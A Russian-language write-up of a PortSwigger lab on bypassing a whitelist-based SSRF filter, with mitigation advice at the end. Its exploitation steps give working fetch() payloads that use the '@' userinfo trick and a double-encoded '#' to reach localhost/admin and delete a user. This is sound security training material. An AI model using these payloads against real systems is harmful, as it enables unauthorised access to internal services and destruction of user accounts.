# PortSwigger Lab: SSRF with whitelist-based input filter

## Описание лаборатории
- **Платформа:** PortSwigger Web Security Academy
- **Сложность:** Expert
- **Цель:** Изменить URL проверки наличия товара, чтобы получить доступ к интерфейсу администратора по адресу `http://localhost/admin`, и удалить пользователя `carlos`. Разработчик внедрил надежную защиту от SSRF, которую необходимо обойти.

## Анализ уязвимости
Приложение использует белый список для ограничения параметра `stockApi` конкретным хостом `stock.weliketoshop.net`. Любой другой хост блокируется.

Однако парсер URL можно обмануть, заставив его интерпретировать URL как принадлежащий разрешенному хосту, в то время как фактический запрос перенаправляется на внутренний `localhost`. Это достигается за счет использования различий в том, как фильтр анализирует URL и как его анализирует базовый HTTP-клиент.

## Шаги эксплуатации
1. Предпринята попытка доступа к панели администратора с использованием стандартного пейлоада (`stockApi=http://localhost/admin`), который был заблокирован фильтром с сообщением: `"External stock check host must be stock.weliketoshop.net"`.
2. Фильтр обойден с помощью символа `@`, чтобы включить доверенный хост в URL, при этом направив запрос на `localhost`:
   ```javascript
   fetch('/product/stock', {
     method: 'POST',
     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
     body: 'stockApi=http://stock.weliketoshop.net@localhost/admin'
   })
   .then(r => r.text())
   .then(t => console.log(t));
   ```
   Это вернуло `500 Internal Server Error`, содержащий HTML-код панели администратора, что подтвердило обход.
3. Для удаления пользователя `carlos` использовался двойной URL-кодированный символ `#` (`%2523`), чтобы гарантировать, что путь `/admin/delete?username=carlos` будет правильно обработан сервером, при этом все еще проходя через фильтр:
   ```javascript
   fetch('/product/stock', {
     method: 'POST',
     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
     body: 'stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos'
   })
   .then(r => r.text())
   .then(t => console.log(t));
   ```
4. Пользователь был удален, и лаборатория решена.

## Доказательства

### Обход фильтра (Доступ к панели администратора)
![SSRF Whitelist Bypass](screenshots/15-ssrf-whitelist-bypass.png)

### Запрос на удаление (Двойное кодирование)
![SSRF Whitelist Delete](screenshots/16-ssrf-whitelist-bypass.png)

### Лаборатория решена
![SSRF Whitelist Solved](screenshots/17-ssrf-whitelist-solved.png)

## Меры защиты (Mitigation)
Для предотвращения этого обхода приложение должно использовать надежный парсер URL и строго проверять конечный пункт назначения.
1. **Парсинг и валидация конечного URL:** Разбирать URL и проверять, что имя хоста точно совпадает с белым списком, не полагаясь на строковое сопоставление.
2. **Отключение функций URL:** Запретить сложные функции URL, такие как userinfo (`@`) и фрагменты (`#`), если они не нужны.
3. **Сетевая защита:** Блокировать исходящие запросы сервера к внутренним IP-адресам (`localhost`, `127.0.0.1`) с помощью файрвола или сетевой политики.